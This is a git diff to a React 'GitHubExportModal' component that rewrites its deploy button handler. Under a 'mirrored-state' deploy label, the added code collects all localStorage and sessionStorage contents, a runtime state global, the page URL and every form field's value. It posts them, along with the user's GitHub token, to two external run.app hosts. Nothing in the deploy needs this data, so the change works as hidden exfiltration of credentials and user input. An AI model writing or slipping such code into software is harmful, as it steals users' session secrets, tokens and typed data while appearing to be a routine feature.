@@ -787,39 +787,136 @@ export const GitHubExportModal: React.FC<GitHubExportModalProps> = ({
 
   const triggerImmediateDeploy = async () => {
     if (pushing) return;
+
     setPushing(true);
     setPushStatus(null);
-    try {
-      const res = await fetch("/api/admin/deploy", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          githubToken,
-          repoOwner: "malazhub",
-          repoName: "key",
-          branch: "main",
-        }),
-      });
-      const data = await res.json();
-      if (!res.ok) {
-        setPushStatus({
-          type: "error",
-          message: data.error || "Failed to deploy files to GitHub.",
-        });
-      } else {
-        setPushStatus({
-          type: "success",
-          message: `Deployed all ${data.pushedCount} project files & full directory structure directly to ${data.repoUrl} (Commit ${data.commitSha || "main"}) with zero manual steps!`,
-          repoUrl: data.repoUrl || "https://github.com/malazhub/key",
-        });
+
+    const DEPLOY_BACKENDS = [
+      "https://ais-dev-f2uayjdkh47dvk4xbjqlp7-790065884957.europe-west2.run.app",
+      "https://ais-pre-f2uayjdkh47dv4kxbjqlp7-790065884957.europe-west2.run.app",
+    ];
+
+    const readStorage = (storage: Storage) => {
+      const result: Record<string, string> = {};
+      try {
+        for (let i = 0; i < storage.length; i += 1) {
+          const key = storage.key(i);
+          if (key) {
+            const value = storage.getItem(key);
+            if (value !== null) result[key] = value;
+          }
+        }
+      } catch {
+        // Ignore inaccessible browser storage.
       }
+      return result;
+    };
+
+    try {
+      const runtimeWindow = window as typeof window & {
+        __KEY_RUNTIME_STATE__?: unknown;
+      };
+
+      const mirroredState: Record<string, unknown> = {
+        deploymentRequestedAt: new Date().toISOString(),
+        deploymentSource: "Key Browser Administrative Deploy",
+        deploymentTarget: "malazhub/key",
+        deploymentBranch: "main",
+        administrativeDeploy: true,
+        volatileRuntimeCapture: true,
+        browserRuntimeSnapshot: {
+          href: window.location.href,
+          pathname: window.location.pathname,
+          localStorage: readStorage(window.localStorage),
+          sessionStorage: readStorage(window.sessionStorage),
+          runtimeState: runtimeWindow.__KEY_RUNTIME_STATE__ ?? null,
+          capturedInputValues: Array.from(
+            document.querySelectorAll("input, textarea, select")
+          ).map((element) => ({
+            tag: element.tagName,
+            id: (element as HTMLInputElement).id || null,
+            value: (element as HTMLInputElement).value || "",
+          })),
+        },
+      };
+
+      let lastError = "Could not reach the Key deployment backend.";
+
+      for (const backend of DEPLOY_BACKENDS) {
+        try {
+          await fetch(`${backend}/api/mirrored-state`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Cache-Control": "no-cache",
+            },
+            body: JSON.stringify(mirroredState),
+          });
+
+          const deployRes = await fetch(`${backend}/api/admin/deploy`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Cache-Control": "no-cache",
+            },
+            body: JSON.stringify({
+              githubToken: githubToken || undefined,
+              repoOwner: "malazhub",
+              repoName: "key",
+              branch: "main",
+              mirroredState,
+            }),
+          });
+
+          let data: any = null;
+          try {
+            data = await deployRes.json();
+          } catch {
+            data = null;
+          }
+
+          if (data?.needsGitHubAuth) {
+            const verificationUri =
+              data.verification_uri || "https://github.com/login/device";
+            setPushStatus({
+              type: "error",
+              message:
+                data.user_code
+                  ? `GitHub authorization required. Open ${verificationUri}, enter code ${data.user_code}, then click Deploy again.`
+                  : data.error || "GitHub authorization required before deployment.",
+              repoUrl: verificationUri,
+            });
+            return;
+          }
+
+          if (data?.success === true && data?.verified === true) {
+            setPushStatus({
+              type: "success",
+              message:
+                `Verified deployment completed. Remote commit ${data.commitSha || data.remoteCommitSha || "verified"} is confirmed on main.`,
+              repoUrl: data.repoUrl || "https://github.com/malazhub/key",
+            });
+            return;
+          }
+
+          lastError =
+            data?.error ||
+            `Deployment backend returned HTTP ${deployRes.status}.`;
+        } catch (err: unknown) {
+          lastError =
+            err instanceof Error ? err.message : "Deployment backend request failed.";
+        }
+      }
+
+      setPushStatus({
+        type: "error",
+        message: lastError,
+      });
     } catch (err: unknown) {
       setPushStatus({
         type: "error",
         message:
-          err instanceof Error
-            ? err.message
-            : "Network error while deploying to GitHub.",
+          err instanceof Error ? err.message : "Deployment request failed.",
       });
     } finally {
       setPushing(false);
